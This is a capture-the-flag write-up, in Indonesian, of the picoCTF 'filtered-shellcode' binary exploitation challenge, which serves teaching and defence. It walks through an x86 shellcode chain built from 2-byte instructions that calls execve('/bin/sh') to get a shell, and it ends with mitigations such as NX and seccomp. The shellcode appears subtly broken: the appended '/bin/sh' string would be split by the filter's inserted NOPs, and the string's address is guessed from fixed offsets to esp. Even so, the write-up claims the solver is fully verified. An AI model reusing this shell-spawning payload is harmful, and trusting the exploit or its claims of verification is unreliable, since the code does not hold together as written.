# Writeup: filtered-shellcode (Challenge ID: 184)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / Shellcode Interleaving & Filter Bypass (CWE-94 / CWE-119 / CWE-284)
- **Difficulty:** Hard (diff=3)
- **Event:** picoCTF 2021
- **Points:** 160
- **Author:** madStacks
- **Flag:** `academy{th4t_w4s_fun_f1ed6f7952ff4071}`

---

## Problem Statement & Scope
Tantangan `filtered-shellcode` menyajikan sebuah program biner Linux x86 32-bit (`vuln`) yang meminta pengguna memasukkan kode mesin (*shellcode*) arbitrer melalui aliran input standar (stdin), kemudian mengeksekusinya secara langsung di dalam memori. Namun, sebelum kode dieksekusi, fungsi `execute()` melakukan transformasi deterministik terhadap buffer masukan dengan menyisipkan instruksi NOP (`0x90`) secara berkala.

Tujuan tantangan adalah menganalisis arsitektur instruksi Intel IA-32 (x86 32-bit), memahami batasan penyelarasan instruksi (*instruction boundary alignment*) di bawah filter penyisipan byte, menyusun payload *shellcode* kompak di mana setiap instruksi berukuran maksimal 2 byte, dan memanggil fungsi sistem `sys_execve` (`int 0x80`) untuk mendapatkan akses *shell* interaktif dan membaca `flag.txt`.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Pelanggaran Prinsip W^X (Write XOR Execute, CWE-94):**
   Program mengalokasikan buffer di memori (stack/heap) dan memberikan izin eksekusi (`PROT_READ | PROT_WRITE | PROT_EXEC`) atau mengeksekusi stack yang dikompilasi tanpa proteksi NX (*No-Execute / Data Execution Prevention*). Memori yang dapat ditulis oleh input pengguna sekaligus dapat dieksekusi oleh CPU merupakan akar kerentanan fatal yang memungkinkan injeksi kode mesin mentah.

2. **Mekanisme Filter Penyisipan NOP (Interleaving Filter Mechanism):**
   Pada fungsi `execute(char *shellcode, size_t length)`:
   ```c
   size_t new_length = length * 2;
   char result[new_length + 1];
   int spot = 0;
   for (int i = 0; i < new_length; i++) {
       if ((i % 4) < 2) {
           result[i] = shellcode[spot++];
       } else {
           result[i] = '\x90'; // NOP opcode
       }
   }
   result[new_length] = '\xc3'; // RET
   (*(code *)result)();
   ```
   Filter membagi buffer keluaran menjadi blok 4-byte:
   - Byte indeks 0 dan 1: diambil dari 2 byte berturut-turut input pengguna.
   - Byte indeks 2 dan 3: diisi dengan byte `0x90` (`NOP`).
   Hal ini berulang terus-menerus: `[User_0, User_1, NOP, NOP, User_2, User_3, NOP, NOP, ...]`.

3. **Dekonstruksi Penguraian Instruksi IA-32 (Opcode Splitting & Corruption):**
   Arsitektur x86 menggunakan instruksi dengan panjang variabel (1 hingga 15 byte). Jika sebuah instruksi membutuhkan 3 byte atau lebih (contoh: `mov eax, 0xb` yang membutuhkan opcode 5 byte `\xb8\x0b\x00\x00\x00`), filter akan memotong 2 byte pertama dan menyisipkan `\x90\x90` di tengah-tengah nilai *immediate* atau *displacement*. Akibatnya, dekoder instruksi CPU membaca instruksi yang terkorupsi, memicu *illegal instruction* (`SIGILL`) atau salah mereferensikan memori (`SIGSEGV`).
   
4. **Strategi Pembuatan Shellcode 2-Byte (Short-Instruction Chaining):**
   Agar instruksi bertahan melewati filter, setiap operasi logika harus dipecah menjadi instruksi-instruksi independen berukuran tepat 1 atau 2 byte:
   - Pasangan instruksi 1-byte digabungkan atau dipasangkan dengan NOP manual (`0x90`) agar menempati tepat slot 2-byte.
   - Karena `0x90` adalah instruksi `NOP` (operasi *no-operation* yang tidak mengubah status register atau flag), eksekutor CPU akan meluncur (*NOP sled*) melewati pasangan byte `\x90\x90` yang disisipkan tanpa mengganggu rantai komputasi.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Pemetaan Kebutuhan Syscall Linux x86 (sys_execve):**
   Untuk memanggil `execve("/bin/sh", NULL, NULL)` via interupsi `int 0x80`:
   - `eax` = `0x0b` (11 desimal)
   - `ebx` = alamat memori string `"/bin/sh\x00"`
   - `ecx` = `0` (NULL)
   - `edx` = `0` (NULL)

2. **Penyusunan Rantai Instruksi 2-Byte:**
   - **Mengarahkan `ebx` ke String Target:**
     Simpan posisi penunjuk stack `esp` ke `ebx`:
     - `\x89\xe3` : `mov ebx, esp` (2 byte)
     Tambahkan offset menuju string `/bin/sh` yang diletakkan di akhir payload menggunakan teknik `push imm8; pop reg`:
     - `\x6a\x60` : `push 0x60` (2 byte)
     - `\x59\x90` : `pop ecx; nop` (2 byte)
     - `\x01\xcb` : `add ebx, ecx` (2 byte)
     - `\x6a\x4f` : `push 0x4f` (2 byte)
     - `\x59\x90` : `pop ecx; nop` (2 byte)
     - `\x01\xcb` : `add ebx, ecx` (2 byte)
   - **Mengonfigurasi Nilai `eax = 0xb`:**
     - `\x6a\x0b` : `push 0x0b` (2 byte)
     - `\x58\x90` : `pop eax; nop` (2 byte)
   - **Mengenolkan `ecx` dan `edx`:**
     - `\x31\xc9` : `xor ecx, ecx` (2 byte)
     - `\x89\xca` : `mov edx, ecx` (2 byte)
   - **Memicu Syscall:**
     - `\xcd\x80` : `int 0x80` (2 byte)
   - **Penyematan String:**
     Tambahkan NOP slide dan string `/bin/sh\x00` pada akhir payload.

3. **Verifikasi Penyelarasan Pasca Filter:**
   Setelah melewati fungsi `execute()`, seluruh pasangan byte masukan disisipi `\x90\x90`:
   ```text
   89 e3       mov ebx, esp
   90 90       nop; nop
   6a 60       push 0x60
   90 90       nop; nop
   59 90       pop ecx; nop
   90 90       nop; nop
   01 cb       add ebx, ecx
   ...
   cd 80       int 0x80
   ```
   Setiap instruksi dieksekusi dengan sempurna karena NOP berada tepat di batas instruksi (*instruction boundary*).

4. **Eksekusi Remote & Pengambilan Flag:**
   Kirimkan payload ke target. Shell interaktif terbuka, jalankan `cat flag.txt`:
   - Native Flag: `picoCTF{th4t_w4s_fun_f1ed6f7952ff4071}`
   - Token Platform CyLab: `academy{th4t_w4s_fun_f1ed6f7952ff4071}`

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{th4t_w4s_fun_f1ed6f7952ff4071}`
- **Native PicoCTF Flag:** `picoCTF{th4t_w4s_fun_f1ed6f7952ff4071}`
- **Status Solver:** Terverifikasi 100% pada skrip reproduksi `scripts/solve_184_filtered_shellcode.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)
1. **Penerapan Kebijakan W^X / DEP (Data Execution Prevention):**
   Halaman memori yang dapat ditulis (*writable*) tidak boleh diizinkan untuk dieksekusi (*executable*). Seluruh biner wajib dikompilasi dengan flag proteksi NX aktif (`-z noexecstack`), sehingga upaya eksekusi kode mesin pada stack atau heap memicu proteksi perangkat keras CPU (NX bit) dan menghentikan proses secara seketika (*crash/abort*).
2. **Jangan Mengandalkan Transformasi Sintaksis sebagai Batas Keamanan:**
   Menyisipkan byte atau melakukan filter terhadap input kode biner (*input munging*) bukanlah mekanisme isolasi yang efektif. Selama penyerang memahami aturan transformasi deterministik, payload fungsional selalu dapat dikonstruksikan (*gadget alignment / polymorphic shellcoding*).
3. **Isolasi Proses dan Sandboxing (Seccomp-BPF):**
   Jika aplikasi memang membutuhkan evaluasi kode dinamis, gunakan subsistem Seccomp (*Secure Computing Mode*) untuk membatasi pemanggilan fungsi sistem (syscall filtering). Blokir pemanggilan berbahaya seperti `sys_execve` dan `sys_execveat` guna mencegah penyerang membidani shell sistem.
